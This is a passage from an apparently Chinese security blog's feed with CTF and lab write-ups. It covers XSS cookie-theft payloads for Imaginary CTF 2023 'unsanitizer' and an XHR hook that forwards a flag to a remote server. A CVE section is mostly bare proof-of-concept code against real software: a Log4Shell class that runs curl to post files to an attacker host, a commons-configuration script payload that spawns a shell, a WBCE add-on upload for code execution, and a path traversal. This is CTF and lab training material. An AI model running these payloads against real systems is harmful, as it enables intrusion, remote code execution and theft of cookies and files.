class="attr">path</span>: filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>),</span><br><span class="line">    <span class="attr">fullPage</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>filePath是我们上传的文件，传入一个html文件，page.goto会访问这个文件，page.evaluate会在访问这个页面的基础上执行里面的代码，也就是访问flag文件<br>只需要将window.XMLHttpRequest给重写了，就可以得到flag<br>wp<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> originalXHR = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title function_">originalXHR</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOpen = xhr.<span class="property">open</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url, <span class="keyword">async</span>, user, password</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> originalOpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOnReadyStateChange = xhr.<span class="property">onreadystatechange</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;XHR请求的responseText：&#x27;</span>, xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">let</span> callback = <span class="keyword">new</span> <span class="title function_">originalXHR</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://vps:port/recv&quot;</span>,<span class="literal">false</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">send</span>(xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (originalOnReadyStateChange) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      originalOnReadyStateChange.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">return</span> xhr;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>onreadystatechange是用于监听 XMLHttpRequest 对象状态改变事件的属性。当XMLHttpRequest的状态发生了改变，就会触发绑定在onreadystatechange上的函数，当readState=4时，代表请求已完成，且响应已就绪。<br>这时候在其中把获取到的flag转发到自己的vps上面，当然也可以直接document.write到页面上，因为runHTMLFile会将页面的截图保存并返回。</p><h2 id="imaginary-ctf-2023-unsanitizer"><a href="#imaginary-ctf-2023-unsanitizer" class="headerlink" title="imaginary ctf 2023 unsanitizer"></a>imaginary ctf 2023 unsanitizer</h2><h3 id="unintended"><a href="#unintended" class="headerlink" title="unintended"></a>unintended</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;text&#x27;</span>).<span class="title function_">send</span>(<span class="string">`Page <span class="subst">$&#123;req.path&#125;</span> not found`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在这一段因为req.path是可控的，但是如果输入尖括号等特殊符号会被url编码，导致无法利用，一般这种情况下就需要想想能不能让这个回显的内容加载进script标签中，或者直接让他进入js文件中<br>下面的payload，就可以让他加入js文件中<br><code>127.0.0.1:3000/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//..%2findex.xhtml#http://127.0.0.1:8000</code><br>将这段放到浏览器的时候，浏览器会把他当做目录为<br><code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie</code><br>文件名为<br><code>..%2findex.xhtml</code><br>去浏览<br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/1.png" alt><br>但是后端会去解析%2f也就是说后端会去返回直接index.xhtml<br>浏览器接收到以后会直接去解析index.xhtml中的内容<br>那么里面的main.js也会被请求为<br><code>http://127.0.0.1:3000/1;location=location.hash.slice(1)+document.cookie//main.js</code><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/2.png" alt><br>因为开头的那段404代码会被uri所控制，所以就变成了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span> /<span class="number">1</span>;<span class="keyword">var</span>[<span class="title class_">Page</span>]=[<span class="number">1</span>];location=location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)+<span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//main.js not found</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/3.png" alt><br>最后就直接跳转到#后面的url了</p><h3 id="intended"><a href="#intended" class="headerlink" title="intended"></a>intended</h3><ul><li>看到下面的代码，可以发现style标签下的尖括号是不会被转义的<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;svg&gt;aa&gt;&lt;/svg&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;svg&gt;aa&amp;gt;&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure></li><li>base的用法<br>href中输入abc，那么之后的所有访问都会基于<a href="http://target/abc/">http://target/abc/</a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=<span class="string">&quot;/abc/&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><p>接下来看到作者的payload<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]＞&lt;/style&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;iframe name=&#x27;Page&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span>&lt;/div&gt;</span><br></pre></td></tr></table></figure><br>在xhtml中<code>&lt;![CDATA[XXXX]]&gt;</code>用于注释<br>利用xhtml和html的不同解析标准，在xhtml中就会变成下面这样<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span>/*&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]*/＞&lt;/style&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &lt;iframe name=&#x27;Page&#x27; /&gt;&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>跟unintended的思路一样，也是利用了会去加载其他js文件，且文件路径可控</p><h2 id="sekai-ctf-golf-jail"><a href="#sekai-ctf-golf-jail" class="headerlink" title="sekai ctf golf-jail"></a>sekai ctf golf-jail</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;持续更新一些国外的前端ctf，因为接触的前端偏少，这里就集中写一下wp&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜CVE</title>
    <link href="http://example.com/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/"/>
    <id>http://example.com/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/</id>
    <published>2023-08-27T03:45:45.000Z</published>
    <updated>2023-08-27T04:22:42.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE系列"><a href="#CVE系列" class="headerlink" title="CVE系列"></a>CVE系列</h1><p>不详细讲原理，只发一下poc<br><span id="more"></span></p><h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><p>log4j<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;curl -X POST -F xx=@/flag  http://xx：8999&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先运行marshalsec<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://xx:8000/#Evil&quot; 1099</code></p><p>同时需要在8000端口起个web服务<br><code>python3 -m http.server 8000</code></p><p>要在8999端口起个nc，用于接受flag<br><code>nc -lvp 8999</code></p><p>输入框输入<br><code>$&#123;jndi:ldap://xx:1099/evil&#125;</code></p><p>不知道为什么不可以反弹shell，就直接用curl了</p><h2 id="CVE-2022-33980"><a href="#CVE-2022-33980" class="headerlink" title="CVE-2022-33980"></a>CVE-2022-33980</h2><p>payload<br><code>Url?url=http://xx:8000/test.xml&amp;data=path</code></p><p>test.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">path</span>&gt;</span>$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;bash -c &#123;xxx&#125;&quot;)&#125;<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>直接弹shell</p><blockquote><p><code>$&#123;url:utf-8:file:///&#125;</code>可以用于读取目录<br><code>$&#123;url:utf-8:file:///flag&#125;</code>可以用于读取文件</p></blockquote><h2 id="CVE-2022-25101"><a href="#CVE-2022-25101" class="headerlink" title="CVE-2022-25101"></a>CVE-2022-25101</h2><p><a href="http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/">http://eci-2zec563boh9uafe744jn.cloudeci1.ichunqiu.com/admin/login/</a><br><code>admin123456</code><br>进入后台<br><img src="/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/1.png" alt><br>install处选择一个压缩包，其中要有info.php，info.php写入你的payload即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$archive</span> = <span class="keyword">new</span> <span class="title class_">PclZip</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// extract Add-on files into WBCE temp folder</span></span><br><span class="line"><span class="variable">$addon_root_path</span> = <span class="title function_ invoke__">find_addon_root_path</span>(<span class="variable">$archive</span>);</span><br><span class="line"><span class="variable">$list</span> = <span class="variable">$archive</span>-&gt;<span class="title function_ invoke__">extract</span>(</span><br><span class="line">    PCLZIP_OPT_PATH,</span><br><span class="line">    <span class="variable">$temp_unzip</span>,</span><br><span class="line">    PCLZIP_CB_PRE_EXTRACT,</span><br><span class="line">    <span class="string">&#x27;pclzip_extraction_filter&#x27;</span>,</span><br><span class="line">    PCLZIP_OPT_REPLACE_NEWER</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if uploaded file is a valid Add-On zip file</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="variable">$list</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>))) &#123;</span><br><span class="line">    <span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">print_error</span>(<span class="variable">$MESSAGE</span>[<span class="string">&#x27;GENERIC_INVALID_ADDON_FILE&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the templates info file</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$template_directory</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$theme_directory</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$temp_unzip</span> . <span class="string">&#x27;info.php&#x27;</span>);</span><br></pre></td></tr></table></figure><br>看看部分源码，可以看到他把压缩包的内容解压出来，然后require了info.php</p><h2 id="CVE-2021-44665"><a href="#CVE-2021-44665" class="headerlink" title="CVE-2021-44665"></a>CVE-2021-44665</h2><p>searchsploit相应的payload即可<br>把<br><code>../../database</code><br>改为<br><code>../../../../../../flag</code><br>即可<br>原理大概就是有一处insert的sql操作没有鉴权，可以用于添加相应的id，然后在getfile.php中可以获取到该id，绕过鉴权，并且他读取文件的操作没有过滤../，具体原理可以自行分析</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CVE系列&quot;&gt;&lt;a href=&quot;#CVE系列&quot; class=&quot;headerlink&quot; title=&quot;CVE系列&quot;&gt;&lt;/a&gt;CVE系列&lt;/h1&gt;&lt;p&gt;不详细讲原理，只发一下poc&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="cve" scheme="http://example.com/tags/cve/"/>
    
    <category term="靶场" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="sql" scheme="http://example.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>codeql</title>
    <link href="http://example.com/2023/08/06/codeql/"/>
    <id>http://example.com/2023/08/06/codeql/</id>
    <published>2023-08-06T08:49:35.000Z</published>
    <updated>2023-08-06T08:49:35.086Z</updated>
    
    
    
    
    
  </entry>
  
</feed>
